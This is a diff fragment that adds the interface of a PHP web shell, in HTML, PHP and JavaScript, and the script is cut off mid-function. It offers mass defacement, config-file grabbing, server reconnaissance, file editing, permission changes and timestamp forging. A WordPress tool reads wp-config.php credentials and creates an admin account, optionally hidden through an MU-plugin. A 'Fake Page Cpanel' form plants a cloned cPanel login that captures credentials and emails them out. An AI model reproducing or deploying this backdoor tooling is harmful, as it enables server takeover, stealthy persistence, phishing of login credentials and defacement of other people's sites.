+            <div id="console-output" style="background: rgba(0,0,0,0.5); padding: 20px; border-radius: 10px; font-family: 'JetBrains Mono', monospace; min-height: 300px; max-height: 400px; color: #22c55e; overflow-y: auto;">
+                <!-- Console output will appear here -->
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Tools Modal -->
+<div id="tools-modal" class="modal-overlay">
+    <div class="modal-container">
+        <div class="modal-header">
+            <h3 class="modal-title"><i class="fa fa-wrench"></i> Tools & Utilities</h3>
+            <div class="modal-controls">
+                <button class="modal-btn" onclick="closeModal('tools')">
+                    <i class="fa fa-times"></i> Close
+                </button>
+            </div>
+        </div>
+        <div class="modal-body">
+            <div class="row">
+                <div class="col-md-6 mb-3">
+                    <div class="card" style="background: rgba(15, 27, 46, 0.7); border: 1px solid rgba(59, 130, 246, 0.3); border-radius: 12px;">
+                        <div class="card-body">
+                            <h5 class="card-title" style="color: #e8f4ff;"><i class="fa fa-database"></i> Adminer</h5>
+                            <p class="card-text" style="color: #94d3ff;">Database management tool</p>
+                            <a href="?path=<?php echo isset($_GET['path'])?normalizePath($_GET['path']):normalizePath(getcwd()); ?>&<?php echo net('ner'); ?>=foxx" class="btn btn-outline-light">Open Adminer</a>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-md-6 mb-3">
+                    <div class="card" style="background: rgba(15, 27, 46, 0.7); border: 1px solid rgba(59, 130, 246, 0.3); border-radius: 12px;">
+                        <div class="card-body">
+                            <h5 class="card-title" style="color: #e8f4ff;"><i class="fa fa-search"></i> Shell Scanner</h5>
+                            <p class="card-text" style="color: #94d3ff;">Scan for backdoors and shells</p>
+                            <a href="?path=<?php echo isset($_GET['path'])?normalizePath($_GET['path']):normalizePath(getcwd()); ?>&<?php echo net('scanshell'); ?>=foxx" class="btn btn-outline-light">Open Scanner</a>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-md-6 mb-3">
+                    <div class="card" style="background: rgba(15, 27, 46, 0.7); border: 1px solid rgba(59, 130, 246, 0.3); border-radius: 12px;">
+                        <div class="card-body">
+                            <h5 class="card-title" style="color: #e8f4ff;"><i class="fa fa-file-archive-o"></i> Mass Deface</h5>
+                            <p class="card-text" style="color: #94d3ff;">Mass file manipulation tool</p>
+                            <a href="?path=<?php echo isset($_GET['path'])?normalizePath($_GET['path']):normalizePath(getcwd()); ?>&<?php echo net('massdef'); ?>=foxx" class="btn btn-outline-light">Open Tool</a>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-md-6 mb-3">
+                    <div class="card" style="background: rgba(15, 27, 46, 0.7); border: 1px solid rgba(59, 130, 246, 0.3); border-radius: 12px;">
+                        <div class="card-body">
+                            <h5 class="card-title" style="color: #e8f4ff;"><i class="fa fa-lock"></i> Hash Identifier</h5>
+                            <p class="card-text" style="color: #94d3ff;">Identify hash algorithms</p>
+                            <a href="?path=<?php echo isset($_GET['path'])?normalizePath($_GET['path']):normalizePath(getcwd()); ?>&<?php echo net('hashiden'); ?>=foxx" class="btn btn-outline-light">Open Tool</a>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-md-6 mb-3">
+                    <div class="card" style="background: rgba(15, 27, 46, 0.7); border: 1px solid rgba(59, 130, 246, 0.3); border-radius: 12px;">
+                        <div class="card-body">
+                            <h5 class="card-title" style="color: #e8f4ff;"><i class="fa fa-download"></i> Config Grabber</h5>
+                            <p class="card-text" style="color: #94d3ff;">Extract configuration files</p>
+                            <a href="?path=<?php echo isset($_GET['path'])?normalizePath($_GET['path']):normalizePath(getcwd()); ?>&<?php echo net('grab_config'); ?>=foxx" class="btn btn-outline-light">Open Tool</a>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-md-6 mb-3">
+                    <div class="card" style="background: rgba(15, 27, 46, 0.7); border: 1px solid rgba(139, 92, 246, 0.3); border-radius: 12px;">
+                        <div class="card-body">
+                            <h5 class="card-title" style="color: #e8f4ff;"><i class="fa fa-wordpress"></i> WordPress Admin</h5>
+                            <p class="card-text" style="color: #94d3ff;">Add new admin user to WordPress</p>
+                            <button onclick="openWordPressModal()" class="btn btn-outline-success">Add Admin</button>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-md-6 mb-3">
+                    <div class="card" style="background: rgba(15, 27, 46, 0.7); border: 1px solid rgba(255, 165, 0, 0.3); border-radius: 12px;">
+                        <div class="card-body">
+                            <h5 class="card-title" style="color: #e8f4ff;"><i class="fa fa-shield"></i> Fake Page Cpanel</h5>
+                            <p class="card-text" style="color: #94d3ff;">Create fake cpanel login page</p>
+                            <button onclick="openFakePageModal()" class="btn btn-outline-warning">Create Fake Page</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- WordPress Admin Modal -->
+<div id="wordpress-modal" class="modal-overlay">
+    <div class="modal-container">
+        <div class="modal-header">
+            <h3 class="modal-title"><i class="fa fa-wordpress"></i> WordPress Admin Creator</h3>
+            <div class="modal-controls">
+                <button class="modal-btn" onclick="closeModal('wordpress')">
+                    <i class="fa fa-times"></i> Close
+                </button>
+            </div>
+        </div>
+        <div class="modal-body">
+            <div class="alert alert-info" style="background: rgba(59, 130, 246, 0.1); border: 1px solid rgba(59, 130, 246, 0.3); border-radius: 8px; padding: 15px; margin-bottom: 20px;">
+                <i class="fa fa-info-circle"></i> This tool will create a new admin user in WordPress database.
+            </div>
+            
+            <!-- GetConfig Section -->
+            <div class="card mb-3" style="background: rgba(139, 92, 246, 0.1); border: 1px solid rgba(139, 92, 246, 0.3);">
+                <div class="card-body">
+                    <h6 class="card-title" style="color: #e8f4ff;"><i class="fa fa-magic"></i> Auto-Fill Configuration</h6>
+                    <p class="card-text" style="color: #94d3ff; font-size: 12px;">Automatically detect WordPress config from wp-config.php</p>
+                    <div class="row">
+                        <div class="col-md-8">
+                            <input type="text" id="wp-config-path" class="form-control" placeholder="/path/to/wordpress/" value="<?php echo $_SERVER['DOCUMENT_ROOT']; ?>/">
+                        </div>
+                        <div class="col-md-4">
+                            <button type="button" onclick="getWordPressConfig()" class="btn btn-outline-light btn-sm">
+                                <i class="fa fa-search"></i> Get Config
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <form id="wordpress-form" onsubmit="createWordPressAdmin(event)">
+                <div class="row">
+                    <div class="col-md-6 mb-3">
+                        <label class="form-label">MySQL Host</label>
+                        <input type="text" name="db_host" class="form-control" value="localhost" required>
+                    </div>
+                    <div class="col-md-6 mb-3">
+                        <label class="form-label">Database Name</label>
+                        <input type="text" name="db_name" class="form-control" placeholder="wordpress_db" required>
+                    </div>
+                    <div class="col-md-6 mb-3">
+                        <label class="form-label">Database User</label>
+                        <input type="text" name="db_user" class="form-control" placeholder="db_username" required>
+                    </div>
+                    <div class="col-md-6 mb-3">
+                        <label class="form-label">Database Password</label>
+                        <input type="text" name="db_pass" class="form-control" placeholder="db_password" required>
+                    </div>
+                    <div class="col-md-6 mb-3">
+                        <label class="form-label">Table Prefix</label>
+                        <input type="text" name="table_prefix" class="form-control" value="wp_" required>
+                    </div>
+                    <div class="col-md-6 mb-3">
+                        <label class="form-label" style="color: #22c55e;">Admin Username</label>
+                        <input type="text" name="admin_user" class="form-control" value="admin" required>
+                    </div>
+                    <div class="col-md-6 mb-3">
+                        <label class="form-label" style="color: #22c55e;">Admin Password</label>
+                        <input type="text" name="admin_pass" class="form-control" value="Fox" required>
+                    </div>
+                    <div class="col-md-6 mb-3">
+                        <label class="form-label" style="color: #22c55e;">Admin Email</label>
+                        <input type="email" name="admin_email" class="form-control" value="admin@site.com" required>
+                    </div>
+                </div>
+                <div class="card mu-plugin-card">
+                    <div class="card-body">
+                        <div class="form-check">
+                            <div class="mu-plugin-content">
+                                <input type="checkbox" class="form-check-input mu-plugin-checkbox wp-tool-checkbox small" 
+                                    id="create_mu_plugin" name="create_mu_plugin" value="1" checked>
+                                <label class="form-check-label mu-plugin-label" for="create_mu_plugin">
+                                    <svg class="mu-plugin-icon" viewBox="0 0 24 24" fill="currentColor">
+                                        <path d="M21 10.12h-6.78l2.74-2.82c-2.73-2.7-7.15-2.8-9.88-.1-2.73 2.71-2.73 7.08 0 9.79 2.73 2.71 7.15 2.71 9.88 0 1.36-1.35 2.04-2.92 2.04-4.9h2c0 1.98-.88 4.55-2.64 6.29-3.51 3.48-9.21 3.48-12.72 0-3.5-3.47-3.53-9.11-.02-12.58 3.51-3.47 9.14-3.47 12.65 0L21 3v7.12z"/>
+                                    </svg>
+                                    Create MU-Plugin (Compatibility & Security)
+                                </label>
+                            </div>
+                            <small class="mu-plugin-desc">
+                                Creates mu-plugins folder/hiden user admin 
+                            </small>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="text-center">
+                    <button type="submit" class="btn btn-outline-success">
+                        <i class="fa fa-plus"></i> Create WordPress Admin
+                    </button>
+                </div>
+            </form>
+            
+            <div id="wordpress-result" style="margin-top: 20px; display: none;"></div>
+        </div>
+    </div>
+</div>
+
+<!-- Information Modal -->
+<div id="info-modal" class="modal-overlay">
+    <div class="modal-container">
+        <div class="modal-header">
+            <h3 class="modal-title"><i class="fa fa-info-circle"></i> System Information</h3>
+            <div class="modal-controls">
+                <button class="modal-btn" onclick="closeModal('info')">
+                    <i class="fa fa-times"></i> Close
+                </button>
+            </div>
+        </div>
+        <div class="modal-body">
+            <div class="row">
+                <div class="col-md-6">
+                    <div class="info-card">
+                        <h5><i class="fa fa-server"></i> Server Information</h5>
+                        <div class="info-item">
+                            <span class="info-label"><i class="fa fa-globe"></i> Server:</span>
+                            <span class="info-value"><?php echo $_SERVER['HTTP_HOST']; ?></span>
+                        </div>
+                        <div class="info-item">
+                            <span class="info-label"><i class="fa fa-map-marker"></i> Server IP:</span>
+                            <span class="info-value"><?php echo ipserv(); ?></span>
+                        </div>
+                        <div class="info-item">
+                            <span class="info-label"><i class="fa fa-user"></i> Your IP:</span>
+                            <span class="info-value"><?php echo $_SERVER['REMOTE_ADDR']; ?></span>
+                        </div>
+                        <div class="info-item">
+                            <span class="info-label"><i class="fa fa-server"></i> Web Server:</span>
+                            <span class="info-value"><?php echo $_SERVER['SERVER_SOFTWARE']; ?></span>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-md-6">
+                    <div class="info-card">
+                        <h5><i class="fa fa-cogs"></i> System Details</h5>
+                        <div class="info-item">
+                            <span class="info-label"><i class="fa fa-desktop"></i> System:</span>
+                            <span class="info-value"><?php echo php_uname(); ?></span>
+                        </div>
+                        <div class="info-item">
+                            <span class="info-label"><i class="fa fa-user-circle"></i> User:</span>
+                            <span class="info-value"><?php echo@get_current_user(); ?> (<?php echo@getmyuid(); ?>)</span>
+                        </div>
+                        <div class="info-item">
+                            <span class="info-label"><i class="fa fa-code"></i> PHP Version:</span>
+                            <span class="info-value"><?php echo@phpversion(); ?> → <?php echo php_sapi_name(); ?></span>
+                        </div>
+                        <div class="info-item">
+                            <span class="info-label"><i class="fa fa-folder-open"></i> Current Dir:</span>
+                            <span class="info-value"><?php echo cekdir(); ?></span>
+                        </div>
+                        <div class="info-item">
+                            <span class="info-label"><i class="fa fa-home"></i> Document Root:</span>
+                            <span class="info-value"><?php echo cekroot(); ?></span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="row mt-4">
+                <div class="col-12">
+                    <div class="info-card">
+                        <h5><i class="fa fa-puzzle-piece"></i> PHP Extensions & Functions</h5>
+                        <div class="row">
+                            <div class="col-md-3">
+                                <div class="extension-status">
+                                    <span class="ext-label">Oracle:</span>
+                                    <span class="ext-status"><?php echo function_exists('oci_connect')?'<font color="#22c55e">ON</font>':'<font color="#ef4444">OFF</font>'; ?></span>
+                                </div>
+                            </div>
+                            <div class="col-md-3">
+                                <div class="extension-status">
+                                    <span class="ext-label">SSH2:</span>
+                                    <span class="ext-status"><?php echo function_exists('ssh2_connect')?'<font color="#22c55e">ON</font>':'<font color="#ef4444">OFF</font>'; ?></span>
+                                </div>
+                            </div>
+                            <div class="col-md-3">
+                                <div class="extension-status">
+                                    <span class="ext-label">MySQL:</span>
+                                    <span class="ext-status"><?php echo function_exists('mysql_connect')?'<font color="#22c55e">ON</font>':'<font color="#ef4444">OFF</font>'; ?></span>
+                                </div>
+                            </div>
+                            <div class="col-md-3">
+                                <div class="extension-status">
+                                    <span class="ext-label">cURL:</span>
+                                    <span class="ext-status"><?php echo function_exists('curl_init')?'<font color="#22c55e">ON</font>':'<font color="#ef4444">OFF</font>'; ?></span>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="row mt-3">
+                            <div class="col-md-3">
+                                <div class="extension-status">
+                                    <span class="ext-label">WGET:</span>
+                                    <span class="ext-status"><?php echo file_exists('/usr/bin/wget')?'<font color="#22c55e">ON</font>':'<font color="#ef4444">OFF</font>'; ?></span>
+                                </div>
+                            </div>
+                            <div class="col-md-3">
+                                <div class="extension-status">
+                                    <span class="ext-label">Perl:</span>
+                                    <span class="ext-status"><?php echo file_exists('/usr/bin/perl')?'<font color="#22c55e">ON</font>':'<font color="#ef4444">OFF</font>'; ?></span>
+                                </div>
+                            </div>
+                            <div class="col-md-3">
+                                <div class="extension-status">
+                                    <span class="ext-label">Python:</span>
+                                    <span class="ext-status"><?php echo file_exists('/usr/bin/python2')?'<font color="#22c55e">ON</font>':'<font color="#ef4444">OFF</font>'; ?></span>
+                                </div>
+                            </div>
+                            <div class="col-md-3">
+                                <div class="extension-status">
+                                    <span class="ext-label">PKEXEC:</span>
+                                    <span class="ext-status"><?php echo(@shell_exec("pkexec --version"))?'<font color="#22c55e">ON</font>':'<font color="#ef4444">OFF</font>'; ?></span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="row mt-4">
+                <div class="col-md-6">
+                    <div class="info-card">
+                        <h5><i class="fa fa-ban"></i> Disabled Functions</h5>
+                        <div class="disabled-functions">
+                            <?php $disfunc=@ini_get("disable_functions");if(empty($disfunc)){echo '<span style="color: #22c55e; font-weight: 600;"><i class="fa fa-check-circle"></i> All functions enabled</span>';}else{echo '<span style="color: #ef4444;"><i class="fa fa-exclamation-triangle"></i> '.$disfunc.'</span>';} ?>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-md-6">
+                    <div class="info-card">
+                        <h5><i class="fa fa-clock-o"></i> Server Status</h5>
+                        <div class="info-item">
+                            <span class="info-label"><i class="fa fa-calendar"></i> Server Time:</span>
+                            <span class="info-value"><?php echo date('Y-m-d H:i:s'); ?></span>
+                        </div>
+                        <div class="info-item">
+                            <span class="info-label"><i class="fa fa-microchip"></i> Max Execution:</span>
+                            <span class="info-value"><?php echo@ini_get('max_execution_time'); ?>s</span>
+                        </div>
+                        <div class="info-item">
+                            <span class="info-label"><i class="fa fa-database"></i> Memory Limit:</span>
+                            <span class="info-value"><?php echo@ini_get('memory_limit'); ?></span>
+                        </div>
+                        <div class="info-item">
+                            <span class="info-label"><i class="fa fa-upload"></i> Upload Max:</span>
+                            <span class="info-value"><?php echo@ini_get('upload_max_filesize'); ?></span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Edit Modal -->
+<div id="edit-modal" class="modal-overlay">
+    <div class="modal-container">
+        <div class="modal-header">
+            <h3 class="modal-title"><i class="fa fa-edit"></i> <span id="edit-filename">Edit File</span></h3>
+            <div class="modal-controls">
+                <button class="modal-btn" onclick="closeModal('edit')">
+                    <i class="fa fa-times"></i> Close
+                </button>
+            </div>
+        </div>
+        <div class="modal-body">
+            <form method="POST" action="?pilihan&path=<?php echo isset($_GET['path'])?normalizePath($_GET['path']):normalizePath(getcwd()); ?>" id="edit-form">
+                <div class="mb-3">
+                    <div class="btn-group" role="group">
+                        <button type="submit" name="gasedit" class="btn btn-outline-success">
+                            <i class="fa fa-save"></i> Save File
+                        </button>
+                        <button type="button" class="btn btn-outline-info" onclick="copyToClipboard('edit-textarea')">
+                            <i class="fa fa-copy"></i> Copy Content
+                        </button>
+                        <button type="button" class="btn btn-outline-warning" onclick="document.getElementById('edit-textarea').value=''">
+                            <i class="fa fa-trash"></i> Clear
+                        </button>
+                    </div>
+                </div>
+                <textarea id="edit-textarea" name="src" rows="25" style="width: 100%; font-family: 'JetBrains Mono', monospace; font-size: 14px;" placeholder="File content will appear here..."></textarea>
+                <input type="hidden" name="path" id="edit-path">
+                <input type="hidden" name="pilih" value="edit">
+            </form>
+        </div>
+    </div>
+</div>
+
+<!-- Rename Modal -->
+<div id="rename-modal" class="modal-overlay">
+    <div class="modal-container">
+        <div class="modal-header">
+            <h3 class="modal-title"><i class="fa fa-pencil"></i> <span id="rename-title">Rename</span></h3>
+            <div class="modal-controls">
+                <button class="modal-btn" onclick="closeModal('rename')">
+                    <i class="fa fa-times"></i> Close
+                </button>
+            </div>
+        </div>
+        <div class="modal-body">
+            <form method="POST" action="?pilihan&path=<?php echo isset($_GET['path'])?normalizePath($_GET['path']):normalizePath(getcwd()); ?>" id="rename-form">
+                <div class="text-center mb-4">
+                    <div class="current-name">
+                        <i class="fa fa-file-o"></i> <span id="current-filename">Current Name</span>
+                    </div>
+                </div>
+                <div class="input-group mb-3">
+                    <span class="input-group-text"><i class="fa fa-pencil"></i></span>
+                    <input type="text" name="newname" class="form-control" placeholder="Enter new name..." required>
+                    <button type="submit" name="gantin" class="btn btn-outline-success">
+                        <i class="fa fa-check"></i> Rename
+                    </button>
+                </div>
+                <input type="hidden" name="path" id="rename-path">
+                <input type="hidden" name="type" id="rename-type">
+                <input type="hidden" name="pilih" value="gantinama">
+            </form>
+        </div>
+    </div>
+</div>
+
+<!-- Chmod Modal -->
+<div id="chmod-modal" class="modal-overlay">
+    <div class="modal-container">
+        <div class="modal-header">
+            <h3 class="modal-title"><i class="fa fa-gear"></i> <span id="chmod-title">Change Permissions</span></h3>
+            <div class="modal-controls">
+                <button class="modal-btn" onclick="closeModal('chmod')">
+                    <i class="fa fa-times"></i> Close
+                </button>
+            </div>
+        </div>
+        <div class="modal-body">
+            <form method="POST" action="?pilihan&path=<?php echo isset($_GET['path'])?normalizePath($_GET['path']):normalizePath(getcwd()); ?>" id="chmod-form">
+                <div class="text-center mb-4">
+                    <div class="current-name">
+                        <i class="fa fa-lock"></i> <span id="chmod-filename">Filename</span>
+                    </div>
+                    <div class="current-perms">
+                        Current: <span id="chmod-current">0644</span>
+                    </div>
+                </div>
+                <div class="row">
+                    <div class="col-md-6">
+                        <div class="permission-preset">
+                            <h6><i class="fa fa-list"></i> Quick Permissions</h6>
+                            <button type="button" class="btn btn-outline-light btn-sm" onclick="setPermission('0644')">0644 - Read/Write Owner</button>
+                            <button type="button" class="btn btn-outline-light btn-sm" onclick="setPermission('0755')">0755 - Full Owner, Read Others</button>
+                            <button type="button" class="btn btn-outline-light btn-sm" onclick="setPermission('0777')">0777 - Full Access All</button>
+                            <button type="button" class="btn btn-outline-light btn-sm" onclick="setPermission('0444')">0444 - Read Only</button>
+                        </div>
+                    </div>
+                    <div class="col-md-6">
+                        <div class="input-group mb-3">
+                            <span class="input-group-text"><i class="fa fa-key"></i></span>
+                            <input type="text" name="mod1" id="chmod-input" class="form-control" maxlength="4" placeholder="0755" required>
+                            <button type="submit" name="ganti" class="btn btn-outline-success">
+                                <i class="fa fa-check"></i> Apply
+                            </button>
+                        </div>
+                    </div>
+                </div>
+                <input type="hidden" name="path" id="chmod-path">
+                <input type="hidden" name="pilih" id="chmod-action">
+            </form>
+        </div>
+    </div>
+</div>
+
+<!-- Change Date Modal -->
+<div id="chdate-modal" class="modal-overlay">
+    <div class="modal-container">
+        <div class="modal-header">
+            <h3 class="modal-title"><i class="fa fa-calendar"></i> <span id="chdate-title">Change Date</span></h3>
+            <div class="modal-controls">
+                <button class="modal-btn" onclick="closeModal('chdate')">
+                    <i class="fa fa-times"></i> Close
+                </button>
+            </div>
+        </div>
+        <div class="modal-body">
+            <form method="POST" action="?pilihan&path=<?php echo isset($_GET['path'])?normalizePath($_GET['path']):normalizePath(getcwd()); ?>" id="chdate-form">
+                <div class="text-center mb-4">
+                    <div class="current-name">
+                        <i class="fa fa-calendar-o"></i> <span id="chdate-filename">Filename</span>
+                    </div>
+                    <div class="current-date">
+                        Current: <span id="chdate-current">Date</span>
+                    </div>
+                </div>
+                <div class="row">
+                    <div class="col-md-6">
+                        <div class="date-preset">
+                            <h6><i class="fa fa-clock-o"></i> Quick Dates</h6>
+                            <button type="button" class="btn btn-outline-light btn-sm" onclick="setCurrentDate()">Now</button>
+                            <button type="button" class="btn btn-outline-light btn-sm" onclick="setDate('2025-01-01 00:00:00')">2025-01-01</button>
+                            <button type="button" class="btn btn-outline-light btn-sm" onclick="setDate('2024-12-31 23:59:59')">2024-12-31</button>
+                        </div>
+                    </div>
+                    <div class="col-md-6">
+                        <div class="input-group mb-3">
+                            <span class="input-group-text"><i class="fa fa-calendar"></i></span>
+                            <input type="text" name="tanggal" id="chdate-input" class="form-control" placeholder="YYYY-MM-DD HH:MM:SS" required>
+                            <button type="submit" name="change" class="btn btn-outline-success">
+                                <i class="fa fa-check"></i> Apply
+                            </button>
+                        </div>
+                    </div>
+                </div>
+                <input type="hidden" name="path" id="chdate-path">
+                <input type="hidden" name="pilih" id="chdate-action">
+            </form>
+        </div>
+    </div>
+</div>
+
+<!-- Fake Page Cpanel Modal -->
+<div id="fakepage-modal" class="modal-overlay">
+    <div class="modal-container">
+        <div class="modal-header">
+            <h3 class="modal-title"><i class="fa fa-shield"></i> Fake Page Cpanel</h3>
+            <div class="modal-controls">
+                <button class="modal-btn" onclick="closeModal('fakepage')">
+                    <i class="fa fa-times"></i> Close
+                </button>
+            </div>
+        </div>
+        <div class="modal-body">
+            <div class="alert alert-warning" style="background: rgba(255, 165, 0, 0.1); border: 1px solid rgba(255, 165, 0, 0.3); border-radius: 8px; padding: 15px; margin-bottom: 20px;">
+                <i class="fa fa-warning"></i> This tool creates a fake cPanel login page to capture credentials.
+            </div>
+            
+            <form method="POST" action="" id="fakepage-form">
+                <div class="row">
+                    <div class="col-md-6">
+                        <div class="form-group mb-3">
+                            <label for="clone_page" style="color: #e8f4ff;">Clone Page URL:</label>
+                            <input type="text" name="clone_page" id="clone_page" class="form-control" placeholder="https://target.com:2083" required>
+                        </div>
+                    </div>
+                    <div class="col-md-6">
+                        <div class="form-group mb-3">
+                            <label for="fake_root" style="color: #e8f4ff;">Fake Page Root:</label>
+                            <input type="text" name="fake_root" id="fake_root" class="form-control" value="<?php echo $_SERVER['DOCUMENT_ROOT']; ?>/fake_page_root/" required>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="row">
+                    <div class="col-md-6">
+                        <div class="form-group mb-3">
+                            <label for="inject_to" style="color: #e8f4ff;">Inject To:</label>
+                            <input type="text" name="inject_to" id="inject_to" class="form-control" value="<?php echo $_SERVER['DOCUMENT_ROOT']; ?>/index.php" required>
+                        </div>
+                    </div>
+                    <div class="col-md-6">
+                        <div class="form-group mb-3">
+                            <label for="bind_on" style="color: #e8f4ff;">Bind On:</label>
+                            <input type="text" name="bind_on" id="bind_on" class="form-control" placeholder="<?php echo $_SERVER['DOCUMENT_ROOT']; ?>/wp-login.php" required>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="row">
+                    <div class="col-md-6">
+                        <div class="form-group mb-3">
+                            <label for="logto" style="color: #e8f4ff;">Email Log:</label>
+                            <input type="email" name="logto" id="logto" class="form-control" placeholder="masukkan email untuk log" required>
+                        </div>
+                    </div>
+                    <div class="col-md-6">
+                        <div class="form-group mb-3">
+                            <label for="count" style="color: #e8f4ff;">Max Invalid Login Count:</label>
+                            <input type="number" name="count" id="count" class="form-control" value="3" min="1" max="10" required>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="text-center">
+                    <button type="submit" name="create_fake_page" class="btn btn-outline-warning">
+                        <i class="fa fa-shield"></i> Create Fake Page
+                    </button>
+                </div>
+                
+                <input type="hidden" name="panel" value="cpanel">
+                <input type="hidden" name="pilih" value="fakepage">
+            </form>
+            
+            <div id="fakepage-result" style="margin-top: 20px; display: none;">
+                <div class="alert" id="fakepage-alert">
+                    <div id="fakepage-message"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+</td>
+<script>
+function myFunction(){var e=document.getElementById("myInput");e.select(),e.setSelectionRange(0,99999),navigator.clipboard.writeText(e.value),alert("Copied Successfully!!")}let __scrollY=0;function lockScroll(){__scrollY=window.scrollY||document.documentElement.scrollTop||0,document.documentElement.classList.add("modal-open"),document.body.classList.add("modal-open")}function unlockScroll(){document.documentElement.classList.remove("modal-open"),document.body.classList.remove("modal-open"),window.scrollTo(0,__scrollY)}function anyModalOpen(){return!!document.querySelector(".modal-overlay.active")}function openModal(e){const t=document.getElementById(e+"-modal");t.classList.add("active"),t.scrollTop=0,lockScroll()}function closeModal(e){if(document.getElementById(e+"-modal").classList.remove("active"),anyModalOpen()||unlockScroll(),"console"===e){document.getElementById("console-minimized").classList.remove("active")}}function minimizeConsole(){const e=document.getElementById("console-modal");e.classList.remove("active"),e.style.display="none",anyModalOpen()||unlockScroll();const t=document.getElementById("console-minimized-fixed");t&&t.remove();const n=document.createElement("div");n.id="console-minimized-fixed",n.onclick=restoreConsole,n.innerHTML='\n        <div style="\n            position: relative;\n            background: rgba(15, 27, 46, 0.9);\n            backdrop-filter: blur(15px);\n            border: 1px solid rgba(59, 130, 246, 0.4);\n            width: 44px;\n            height: 130px;\n            cursor: pointer;\n            border-bottom-left-radius: 5px;\n            border-top-left-radius: 5px;\n            box-shadow: 0 0 15px rgba(59, 130, 246, 0.6);\n        ">\n            <div style="\n                color: #ffffff;\n                font-size: 15px;\n                font-family: Orbitron, Roboto, sans-serif;\n                font-weight: bold;\n                text-shadow: 0 0 8px rgba(59, 130, 246, 0.8);\n                position: absolute;\n                left: 27%;\n                transform: translateX(-50%);\n                width: 20px;\n                height: 120px;\n                text-align: center;\n                line-height: 1.3;\n                writing-mode: vertical-rl;\n                text-orientation: mixed;\n            "><i class="fa fa-terminal"></i> Console</div>\n        </div>\n    ',n.style.position="fixed",n.style.right="-30px",n.style.top="200px",n.style.width="50px",n.style.height="140px",n.style.zIndex="999999999",n.style.display="block",n.style.pointerEvents="auto",document.documentElement.appendChild(n),anyModalOpen()||unlockScroll()}function restoreConsole(){const e=document.getElementById("console-modal"),t=document.getElementById("console-minimized-fixed");t&&t.remove(),e.style.display="block",e.classList.add("active"),lockScroll()}function openWordPressModal(){document.getElementById("wordpress-modal").classList.add("active"),lockScroll()}function openFakePageModal(){document.getElementById("fakepage-modal").classList.add("active"),lockScroll()}function getWordPressConfig(){const e=document.getElementById("wp-config-path").value.trim();if(!e)return void alert("Please enter WordPress installation path");const t=event.target,n=t.innerHTML;t.innerHTML='<i class="fa fa-spinner fa-spin"></i> Loading...',t.disabled=!0,fetch(window.location.href,{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:"action=get_wp_config&wp_path="+encodeURIComponent(e)}).then(e=>e.json()).then(e=>{e.host&&(document.querySelector('input[name="db_host"]').value=e.host),e.dbname&&(document.querySelector('input[name="db_name"]').value=e.dbname),e.user&&(document.querySelector('input[name="db_user"]').value=e.user),e.password&&(document.querySelector('input[name="db_pass"]').value=e.password),e.prefix&&(document.querySelector('input[name="table_prefix"]').value=e.prefix),t.innerHTML='<i class="fa fa-check"></i> Config Loaded',t.style.backgroundColor="rgba(34, 197, 94, 0.25)",setTimeout(()=>{t.innerHTML=n,t.style.backgroundColor="",t.disabled=!1},2e3)}).catch(e=>{alert("Error loading config: "+e),t.innerHTML=n,t.disabled=!1})}function createWordPressAdmin(e){e.preventDefault();const t=e.target,n=new FormData(t),o={action:"create_wp_admin",db_host:n.get("db_host"),db_name:n.get("db_name"),db_user:n.get("db_user"),db_pass:n.get("db_pass"),table_prefix:n.get("table_prefix"),admin_user:n.get("admin_user"),admin_pass:n.get("admin_pass"),admin_email:n.get("admin_email"),create_mu_plugin:document.getElementById("create_mu_plugin").checked?"1":"0"},a=document.getElementById("wordpress-result");a.style.display="block",a.innerHTML='<div style="text-align: center; color: #06b6d4;"><i class="fa fa-spinner fa-spin"></i> Creating WordPress admin...</div>',fetch(window.location.href,{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:Object.keys(o).map(e=>e+"="+encodeURIComponent(o[e])).join("&")}).then(e=>e.text()).then(e=>{e.includes("Success")?a.innerHTML='<div style="color: #22c55e; text-align: center;"><i class="fa fa-check"></i> '+e+"</div>":a.innerHTML='<div style="color: #ef4444; text-align: center;"><i class="fa fa-exclamation-triangle"></i> '+e+"</div>"}).catch(e=>{a.innerHTML='<div style="color: #ef4444; text-align: center;"><i class="fa fa-times"></i> Error: '+e+"</div>"})}function convertActionButtons(){document.querySelectorAll('button[name="pilih"][value="edit"]').forEach(e=>{const t=e.closest("form").querySelectorAll('input[type="hidden"]');let n="",o="";t.forEach(e=>{"name"===e.name&&(n=e.value),"path"===e.name&&(o=e.value)}),e.type="button",e.onclick=function(e){window.lastClickedElement=e.target,openEditModal(n,o,e)}}),document.querySelectorAll('button[name="pilih"][value="gantinama"]').forEach(e=>{const t=e.closest("form").querySelectorAll('input[type="hidden"]');let n="",o="",a="";t.forEach(e=>{"name"===e.name&&(n=e.value),"path"===e.name&&(o=e.value),"type"===e.name&&(a=e.value)}),e.type="button",e.onclick=function(){openRenameModal(n,o,a)}}),document.querySelectorAll('button[name="pilih"][value="chmod"], button[name="pilih"][value="chmodf"]').forEach(e=>{const t=e.closest("form").querySelectorAll('input[type="hidden"]');let n="",o="",a="";t.forEach(e=>{"name"===e.name&&(n=e.value),"path"===e.name&&(o=e.value),"type"===e.name&&(a=e.value)});const 